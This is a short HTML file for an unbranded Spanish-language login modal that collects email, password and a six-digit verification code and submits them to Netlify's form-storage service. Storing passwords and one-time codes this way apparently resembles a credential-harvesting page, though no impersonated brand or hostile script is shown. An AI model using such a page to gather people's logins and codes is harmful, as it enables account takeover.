<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<link rel="stylesheet" href="css/style.css" />
</head>
<body>

  <button class="open-btn" id="openBtn">Iniciar sesión</button>

  <div class="overlay" id="overlay">
    <div class="modal">
      <button class="close-btn" id="closeBtn" aria-label="Cerrar">✕</button>
      <h2>Iniciar sesión</h2>
      <form id="loginForm" name="login" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="login" />
        <div class="field">
          <label for="email">Correo</label>
          <input type="email" id="email" name="email" required placeholder="tu@correo.com" />
        </div>
        <div class="field">
          <label for="password">Contraseña</label>
          <input type="password" id="password" name="password" required placeholder="••••••••" />
        </div>
        <div class="field">
          <label for="code">Código de verificación (6 dígitos)</label>
          <input
            type="text"
            id="code"
            name="code"
            required
            inputmode="numeric"
            pattern="[0-9]{6}"
            maxlength="6"
            placeholder="000000"
          />
        </div>
        <button type="submit" class="submit-btn" id="submitBtn" disabled>Entrar</button>
      </form>
    </div>
  </div>

  <script src="js/script.js"></script>
</body>
</html>
